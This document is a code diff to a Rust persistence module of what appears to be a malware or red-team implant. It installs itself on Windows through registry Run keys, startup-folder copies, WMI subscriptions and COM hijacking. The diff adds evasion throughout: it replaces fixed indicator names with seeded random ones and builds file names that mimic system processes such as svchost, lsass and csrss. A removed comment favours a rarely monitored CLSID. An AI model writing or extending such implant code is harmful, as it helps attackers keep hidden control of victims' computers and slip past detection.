@@ -1,6 +1,96 @@
 /// Advanced Persistence Module mapped to traits (FR-1 through FR-4)
 use anyhow::Result;
+use common::config::PersistenceConfig;
 use std::path::PathBuf;
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Random IoC generation helpers
+// ──────────────────────────────────────────────────────────────────────────────
+
+/// Deterministic seed derived from the agent executable path so that
+/// `install()` and `remove()` / `verify()` produce the same random IoC values
+/// across calls for the same binary.
+fn ioc_seed() -> u64 {
+    use std::hash::{Hash, Hasher};
+    let exe = std::env::current_exe().unwrap_or_default();
+    let mut h = std::collections::hash_map::DefaultHasher::new();
+    exe.hash(&mut h);
+    h.finish()
+}
+
+/// Generate a random alphanumeric string of 8–12 characters, seeded by
+/// `ioc_seed()` XORed with a per-field discriminator so each field gets a
+/// different value.
+fn random_alphanum(discriminator: u64) -> String {
+    use rand::prelude::*;
+    let mut rng = StdRng::seed_from_u64(ioc_seed() ^ discriminator);
+    let len = rng.gen_range(8..=12);
+    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    (0..len).map(|_| CHARSET[rng.gen_range(0..CHARSET.len())] as char).collect()
+}
+
+/// Generate a random valid CLSID string like `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`.
+fn random_clsid(discriminator: u64) -> String {
+    use rand::prelude::*;
+    let mut rng = StdRng::seed_from_u64(ioc_seed() ^ discriminator);
+    let mut hex = |n: usize| -> String {
+        (0..n).map(|_| {
+            let b = rng.gen_range(0u8..=15);
+            format!("{:x}", b)
+        }).collect()
+    };
+    format!("{{{}-{}-{}-{}-{}}}", hex(8), hex(4), hex(4), hex(4), hex(12))
+}
+
+/// Legitimate-sounding Windows service/executable name components.
+const SVC_PREFIXES: &[&str] = &[
+    "ms", "win", "sys", "wua", "wmp", "dll", "svch", "ctf", "dwm", "lsass",
+    "smss", "csrss", "services", "spool", "taskhost", "runtime",
+];
+const SVC_VERBS: &[&str] = &[
+    "update", "helper", "broker", "host", "svc", "core", "net", "sec",
+    "diag", "notify", "diag", "mgr", "disp", "sched",
+];
+
+/// Generate a random legitimate-sounding `.exe` filename.
+fn random_exe_filename(discriminator: u64) -> String {
+    use rand::prelude::*;
+    let mut rng = StdRng::seed_from_u64(ioc_seed() ^ discriminator);
+    let prefix = SVC_PREFIXES[rng.gen_range(0..SVC_PREFIXES.len())];
+    let verb = SVC_VERBS[rng.gen_range(0..SVC_VERBS.len())];
+    let digits: String = (0..rng.gen_range(1..=3))
+        .map(|_| char::from_digit(rng.gen_range(0..=9), 10).unwrap())
+        .collect();
+    format!("{}{}{}.exe", prefix, verb, digits)
+}
+
+/// Resolve the effective registry Run key value name from config or random.
+fn resolve_registry_value_name(cfg: &PersistenceConfig) -> String {
+    cfg.registry_value_name
+        .clone()
+        .unwrap_or_else(|| random_alphanum(0x11))
+}
+
+/// Resolve the effective WMI subscription name from config or random.
+fn resolve_wmi_subscription_name(cfg: &PersistenceConfig) -> String {
+    cfg.wmi_subscription_name
+        .clone()
+        .unwrap_or_else(|| random_alphanum(0x22))
+}
+
+/// Resolve the effective COM hijack CLSID from config or random.
+fn resolve_com_hijack_clsid(cfg: &PersistenceConfig) -> String {
+    cfg.com_hijack_clsid
+        .clone()
+        .unwrap_or_else(|| random_clsid(0x33))
+}
+
+/// Resolve the effective startup folder filename from config or random.
+fn resolve_startup_filename(cfg: &PersistenceConfig) -> String {
+    cfg.startup_filename
+        .clone()
+        .unwrap_or_else(|| random_exe_filename(0x44))
+}
 
 #[allow(clippy::ptr_arg)]
 pub trait Persist {
@@ -31,10 +121,11 @@ pub mod windows {
         pub value_name: String,
     }
 
-    impl Default for RegistryRunKey {
-        fn default() -> Self {
+    impl RegistryRunKey {
+        /// Construct with a config-driven or randomly-generated value name.
+        pub fn from_config(cfg: &PersistenceConfig) -> Self {
             Self {
-                value_name: "WindowsUpdate".to_string(),
+                value_name: resolve_registry_value_name(cfg),
             }
         }
     }
@@ -646,10 +737,11 @@ pub mod windows {
         pub subscription_name: String,
     }
 
-    impl Default for WmiSubscription {
-        fn default() -> Self {
+    impl WmiSubscription {
+        /// Construct with a config-driven or randomly-generated subscription name.
+        pub fn from_config(cfg: &PersistenceConfig) -> Self {
             Self {
-                subscription_name: "UpdateCheck".to_string(),
+                subscription_name: resolve_wmi_subscription_name(cfg),
             }
         }
     }
@@ -752,14 +844,11 @@ pub mod windows {
         pub clsid: String,
     }
 
-    impl Default for ComHijacking {
-        fn default() -> Self {
-            // Thumbnail cache handler — loaded by explorer.exe frequently
-            // {C56A4180-65AA-11D0-A5CC-00A024159FAD} is the MIDI Sequence Object —
-            // a legitimate inprocserver32 registration that is rarely monitored,
-            // unlike the well-known thumbnail-cache CLSID.
+    impl ComHijacking {
+        /// Construct with a config-driven or randomly-generated CLSID.
+        pub fn from_config(cfg: &PersistenceConfig) -> Self {
             Self {
-                clsid: "{C56A4180-65AA-11D0-A5CC-00A024159FAD}".to_string(),
+                clsid: resolve_com_hijack_clsid(cfg),
             }
         }
     }
@@ -875,13 +964,30 @@ pub mod windows {
     }
 
     // ── FR-1D: Startup Folder ─────────────────────────────────────────────────
-    pub struct StartupFolder;
+    pub struct StartupFolder {
+        pub filename: String,
+    }
+
+    impl StartupFolder {
+        /// Construct with a config-driven or randomly-generated filename.
+        pub fn from_config(cfg: &PersistenceConfig) -> Self {
+            Self {
+                filename: resolve_startup_filename(cfg),
+            }
+        }
+
+        fn startup_path(&self) -> Option<PathBuf> {
+            let mut target = dirs::config_dir()?;
+            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+            target.push(&self.filename);
+            Some(target)
+        }
+    }
 
     impl Persist for StartupFolder {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            let mut target =
-                dirs::config_dir().ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
-            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
+            let target = self.startup_path()
+                .ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
             std::fs::copy(executable_path, &target)
                 .map_err(|e| anyhow!("StartupFolder::install: copy failed: {}", e))?;
             log::info!("StartupFolder::install: copied to '{}'", target.display());
@@ -889,44 +995,38 @@ pub mod windows {
         }
 
         fn remove(&self) -> Result<()> {
-            let mut target = match dirs::config_dir() {
-                Some(d) => d,
-                None => return Ok(()),
-            };
-            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
-            let _ = std::fs::remove_file(&target);
-            log::info!("StartupFolder::remove: removed '{}'", target.display());
+            if let Some(target) = self.startup_path() {
+                let _ = std::fs::remove_file(&target);
+                log::info!("StartupFolder::remove: removed '{}'", target.display());
+            }
             Ok(())
         }
 
         fn verify(&self) -> Result<bool> {
-            let mut target = match dirs::config_dir() {
-                Some(d) => d,
-                None => return Ok(false),
-            };
-            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
-            Ok(target.exists())
+            match self.startup_path() {
+                Some(target) => Ok(target.exists()),
+                None => Ok(false),
+            }
         }
     }
 
     pub fn install_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
-        let cfg = crate::config::load_config()
-            .unwrap_or_default()
-            .persistence;
+        let full_cfg = crate::config::load_config().unwrap_or_default();
+        let cfg = &full_cfg.persistence;
 
         if cfg.registry_run_key {
-            if let Err(e) = RegistryRunKey::default().install(&exe) {
+            if let Err(e) = RegistryRunKey::from_config(cfg).install(&exe) {
                 log::warn!("RegistryRunKey install failed (non-fatal): {}", e);
             }
         }
         if cfg.startup_folder {
-            if let Err(e) = StartupFolder.install(&exe) {
+            if let Err(e) = StartupFolder::from_config(cfg).install(&exe) {
                 log::warn!("StartupFolder install failed (non-fatal): {}", e);
             }
         }
         if cfg.wmi_subscription {
-            if let Err(e) = WmiSubscription::default().install(&exe) {
+            if let Err(e) = WmiSubscription::from_config(cfg).install(&exe) {
                 log::warn!("WmiSubscription install failed (non-fatal): {}", e);
             }
         }
@@ -945,7 +1045,7 @@ pub mod windows {
                      COM hijacking requires a cdylib build target",
                     exe.display()
                 );
-            } else if let Err(e) = ComHijacking::default().install(&exe) {
+            } else if let Err(e) = ComHijacking::from_config(cfg).install(&exe) {
                 log::warn!("ComHijacking install failed (non-fatal): {}", e);
             }
         }
@@ -955,10 +1055,12 @@ pub mod windows {
 
     pub fn uninstall_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
-        let _ = RegistryRunKey::default().remove();
-        let _ = StartupFolder.remove();
-        let _ = WmiSubscription::default().remove();
-        let _ = ComHijacking::default().remove();
+        let full_cfg = crate::config::load_config().unwrap_or_default();
+        let cfg = &full_cfg.persistence;
+        let _ = RegistryRunKey::from_config(cfg).remove();
+        let _ = StartupFolder::from_config(cfg).remove();
+        let _ = WmiSubscription::from_config(cfg).remove();
+        let _ = ComHijacking::from_config(cfg).remove();
         Ok(exe)
     }
 }
